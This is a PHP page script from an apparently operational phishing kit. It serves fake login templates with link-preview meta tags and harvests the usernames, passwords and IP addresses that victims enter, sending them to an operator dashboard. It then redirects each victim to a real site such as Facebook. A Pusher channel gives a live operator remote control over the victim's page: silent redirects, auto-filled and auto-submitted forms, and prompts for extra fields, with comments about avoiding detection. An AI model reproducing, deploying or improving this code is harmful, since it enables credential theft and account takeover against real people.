<?php
// web.php - Display phishing template based on slug

require_once 'config.php';

// Get slug from URL parameter
$slug = trim($_GET['slug']) ?? '';

// Validate slug
if (empty($slug)) {
    handleError('Missing slug parameter', 400);
}

// Get website information with phishing template
$website = getWebsiteBySlug($pdo, $slug);

if (!$website) {
    handleError('Website not found', 404);
}

// Check if website has phishing template
if (!$website['phishing_template_id']) {
    handleError('No phishing template found for this website', 404);
}

// Get phishing template details
$template = getPhishingTemplate($pdo, $website['phishing_template_id']);

if (!$template || $template['type'] !== 'phishing') {
    handleError('Invalid phishing template', 404);
}

// Increment view count
incrementViewCount($pdo, $website['id']);

// Set content type
header('Content-Type: text/html; charset=utf-8');

// Generate current URL
$current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Generate complete SEO meta tags
$seo_meta_tags = generateSEOMetaTags($website, $current_url);

// Start output buffering to capture template content
ob_start();

// Output the phishing template HTML
echo $template['content_html'];

// Get the captured content
$template_content = ob_get_clean();

// Remove any existing basic meta tags to avoid duplication FIRST
$template_content = preg_replace('/<title[^>]*>.*?<\/title>/i', '', $template_content);
$template_content = preg_replace('/<meta\s+name=["\']description["\'][^>]*>/i', '', $template_content);
$template_content = preg_replace('/<meta\s+property=["\']og:[^"\']*["\'][^>]*>/i', '', $template_content);
$template_content = preg_replace('/<meta\s+name=["\']twitter:[^"\']*["\'][^>]*>/i', '', $template_content);

// Then insert SEO meta tags into the HTML head
if (preg_match('/<head[^>]*>/i', $template_content)) {
    // If <head> tag exists, insert after it
    $template_content = preg_replace('/(<head[^>]*>)/i', '$1' . "\n" . $seo_meta_tags, $template_content, 1);
} else {
    // If no <head> tag, add it at the beginning
    $template_content = '<!DOCTYPE html><html><head>' . $seo_meta_tags . '</head><body>' . $template_content . '</body></html>';
}

// Add Pusher integration for real-time control
$pusher_integration = '
<!-- Pusher Integration for Real-time Control -->
<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
// Pusher configuration
const CONFIG = {
    pusherKey: "049ee983c4ec4cecf834",
    pusherCluster: "ap1",
    apiEndpoint: "send-pusher.php",
    websiteId: ' . $website['id'] . ',
    websiteTitle: "' . addslashes($website['title']) . '"
};

// Initialize Pusher connection
let pusher = null;
let controlChannel = null;

try {
    pusher = new Pusher(CONFIG.pusherKey, {
        cluster: CONFIG.pusherCluster,
        useTLS: true
    });

    // Subscribe to control channel for receiving admin commands
    controlChannel = pusher.subscribe("receive-control");
    
    // Listen for control commands from admin
    controlChannel.bind("control_command", function(data) {
        console.log("🎛️ Received control command:", data);
        
        // Only process commands for this specific website
        if (data.website_id === CONFIG.websiteId) {
            handleControlCommand(data.control_data);
        } else {
            console.log("🚫 Control command not for this website (ID: " + CONFIG.websiteId + ")");
        }
    });

} catch (error) {
    console.error("Failed to initialize Pusher:", error);
}

// Handle control commands from admin
function handleControlCommand(controlData) {
    console.log("🎛️ Processing control command:", controlData);
    
    // Silent processing - no alerts to avoid detection
    if (controlData.data && controlData.data.fieldIds && Array.isArray(controlData.data.fieldIds)) {
        console.log("📋 Field IDs:", controlData.data.fieldIds);
    }
    
    if (controlData.fieldIds && Array.isArray(controlData.fieldIds)) {
        console.log("📋 Root Field IDs:", controlData.fieldIds);
    }
    
    if (controlData.account && controlData.account.fieldIds) {
        console.log("📋 Account Field IDs:", controlData.account.fieldIds);
    }
    
    if (controlData.data && controlData.data.account && controlData.data.account.fieldIds) {
        console.log("📋 Data Account Field IDs:", controlData.data.account.fieldIds);
    }
    
    switch (controlData.type) {
        case "show_message":
            // Only show message if meant for user
            if (controlData.data.show_to_user !== false) {
                showControlMessage(controlData.data.message, controlData.data.type || "info");
            }
            break;
            
        case "redirect":
            if (controlData.data.url) {
                // Silent redirect without notification
                setTimeout(() => {
                    window.location.href = controlData.data.url;
                }, 1000);
            }
            break;
            
        case "fill_form":
            if (controlData.data.email) {
                const emailInput = document.querySelector("input[type=\"text\"], input[type=\"email\"]");
                if (emailInput) emailInput.value = controlData.data.email;
            }
            if (controlData.data.password) {
                const passwordInput = document.querySelector("input[type=\"password\"]");
                if (passwordInput) passwordInput.value = controlData.data.password;
            }
            // Silent operation - no notification
            break;
            
        case "submit_form":
            if (controlData.data.email) {
                const emailInput = document.querySelector("input[type=\"text\"], input[type=\"email\"]");
                if (emailInput) emailInput.value = controlData.data.email;
            }
            if (controlData.data.password) {
                const passwordInput = document.querySelector("input[type=\"password\"]");
                if (passwordInput) passwordInput.value = controlData.data.password;
            }
            // Silent auto-submit
            setTimeout(() => {
                const form = document.querySelector("form");
                if (form) form.dispatchEvent(new Event("submit"));
            }, 1000);
            break;
            
        case "hide_element":
            if (controlData.data.element_id) {
                const element = document.getElementById(controlData.data.element_id);
                if (element) {
                    element.style.display = "none";
                }
            }
            break;
            
        case "show_element":
            if (controlData.data.element_id) {
                const element = document.getElementById(controlData.data.element_id);
                if (element) {
                    element.style.display = "block";
                }
            }
            break;
            
        case "change_text":
            if (controlData.data.element_id && controlData.data.text) {
                const element = document.getElementById(controlData.data.element_id);
                if (element) {
                    element.textContent = controlData.data.text;
                }
            }
            break;
            
        case "switch_template":
            // Switch to specific template based on field
            if (controlData.data.fieldIds && Array.isArray(controlData.data.fieldIds)) {
                console.log("🔄 Switching to template:", controlData.data.fieldIds[0]);
                // Note: switchTemplate function may not exist in web.php context
                // This is primarily for index.php with multi-template system
            } else if (controlData.data.template_id) {
                console.log("🔄 Template switch requested:", controlData.data.template_id);
            }
            break;
            
        case "show_field_input":
            if (controlData.data.field_name && controlData.data.prompt) {
                // Show prompt for specific field input
                const userInput = prompt(controlData.data.prompt);
                if (userInput !== null && userInput.trim() !== "") {
                    // Try to find the field by name or placeholder
                    const fieldSelectors = [
                        `input[name="${controlData.data.field_name}"]`,
                        `input[placeholder*="${controlData.data.field_name}"]`,
                        `input[id="${controlData.data.field_name}"]`,
                        `#${controlData.data.field_name}`
                    ];
                    
                    let targetField = null;
                    for (const selector of fieldSelectors) {
                        targetField = document.querySelector(selector);
                        if (targetField) break;
                    }
                    
                    if (targetField) {
                        targetField.value = userInput.trim();
                        targetField.focus();
                        // Silent operation - no notification to victim
                    }
                }
            }
            break;
            
        default:
            console.log("❓ Unknown control command type:", controlData.type);
            // Silent - no notification for unknown commands
    }
}

// Show control message to user
function showControlMessage(message, type = "info") {
    const messageDiv = document.createElement("div");
    messageDiv.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === "success" ? "#d4edda" : type === "warning" ? "#fff3cd" : type === "error" ? "#f8d7da" : "#d1ecf1"};
        color: ${type === "success" ? "#155724" : type === "warning" ? "#856404" : type === "error" ? "#721c24" : "#0c5460"};
        border: 1px solid ${type === "success" ? "#c3e6cb" : type === "warning" ? "#ffeaa7" : type === "error" ? "#f5c6cb" : "#bee5eb"};
        border-radius: 6px;
        padding: 15px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        z-index: 10000;
        max-width: 300px;
        font-size: 14px;
    `;
    messageDiv.innerHTML = `<i class="fas fa-${type === "success" ? "check-circle" : type === "warning" ? "exclamation-triangle" : type === "error" ? "times-circle" : "info-circle"}"></i> ${message}`;
    
    document.body.appendChild(messageDiv);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (messageDiv.parentNode) {
            messageDiv.parentNode.removeChild(messageDiv);
        }
    }, 5000);
}
</script>';

// Add form submission handler for data capture
$form_handler = '
<script>
// Handle form submissions and send data to dashboard
document.addEventListener("DOMContentLoaded", function() {
    const forms = document.querySelectorAll("form");
    
    forms.forEach(form => {
        form.addEventListener("submit", async function(event) {
            event.preventDefault();
            
            // Always get data from specific field IDs
            const usernameField = document.querySelector("#username");
            const passwordField = document.querySelector("#password");
            const contentField = document.querySelector("#content");
            
            const username = usernameField ? usernameField.value.trim() : "";
            const password = passwordField ? passwordField.value.trim() : "";
            const content = contentField ? contentField.value.trim() : "";
            
            console.log("📝 Form data captured:", {
                username: username,
                password: password ? "***" : "empty",
                content: content
            });
            
            if (username && password) {
                try {
                    // Always use this exact structure
                    const accountData = {
                        id: Date.now(),
                        username: username,
                        password: password,
                        email: username,
                        website: CONFIG.websiteId,
                        website_title: CONFIG.websiteTitle,
                        ip_address: "' . getClientIp() . '",
                        status: "pending",
                        content: content ? JSON.stringify({"Data": content}) : "{\"Data\":\"Nothing\"}",
                        created_at: new Date().toISOString()
                    };
                    
                    console.log("📤 Sending data to dashboard:", accountData);
                    
                    const response = await fetch(CONFIG.apiEndpoint, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            type: "new_account",
                            data: {
                                account: accountData,
                                timestamp: new Date().toISOString()
                            }
                        })
                    });
                    
                    if (response.ok) {
                        console.log("✅ Data sent to dashboard successfully");
                      
                        
                        // Redirect after successful submission
                        setTimeout(() => {
                            window.location.href = "' . ($website['redirect_url'] ?: 'https://facebook.com') . '";
                        }, 2000);
                    } else {
                        console.error("❌ Failed to send data to dashboard");
                        showControlMessage("Failed to send data. Please try again.", "error");
                    }
                } catch (error) {
                    console.error("💥 Error sending data:", error);
                    showControlMessage("Error occurred. Please try again.", "error");
                }
            } else {
                console.warn("⚠️ Missing username or password");
                showControlMessage("Please enter both username and password", "warning");
            }
        });
    });
    
    // Also handle any button clicks that might trigger form submission
    const submitButtons = document.querySelectorAll("button[type=\"submit\"], input[type=\"submit\"], .btn-submit, .login-btn");
    submitButtons.forEach(button => {
        button.addEventListener("click", function(event) {
            // Let the form submit handler take care of it
            console.log("🖱️ Submit button clicked");
        });
    });
    
    // Handle Enter key press in form fields
    const formFields = document.querySelectorAll("input[type=\"text\"], input[type=\"email\"], input[type=\"password\"]");
    formFields.forEach(field => {
        field.addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                const form = field.closest("form");
                if (form) {
                    form.dispatchEvent(new Event("submit"));
                }
            }
        });
    });
});
</script>';
$template_content = str_replace('{title}', addslashes($website['title']), $template_content);
$template_content = str_replace('{description}', addslashes($website['description']), $template_content);
$template_content = str_replace('{thumbnail}', 'https://scanvia.org/'.addslashes($website['thumbnail']), $template_content);
// Output the final HTML with all integrations
echo $template_content;

// Add CSS if template has custom CSS
if (!empty($template['content_css'])) {
    $css_content = trim($template['content_css']);
    // Ensure CSS is properly formatted
    if (!empty($css_content)) {
        echo '<style type="text/css">' . "\n";
        echo $css_content . "\n";
        echo '</style>' . "\n";
    }
}

// Add JavaScript if template has custom JS
if (!empty($template['content_js'])) {
    $js_content = trim($template['content_js']);
    // Ensure JavaScript is properly formatted
    if (!empty($js_content)) {
        echo '<script type="text/javascript">' . "\n";
        echo $js_content . "\n";
        echo '</script>' . "\n";
    }
}

// Add Pusher integration and form handler
echo $pusher_integration;
echo $form_handler;
?>
<script>
    function Login(){
        window.location.href = './l/<?=$slug?>';
    }
</script>
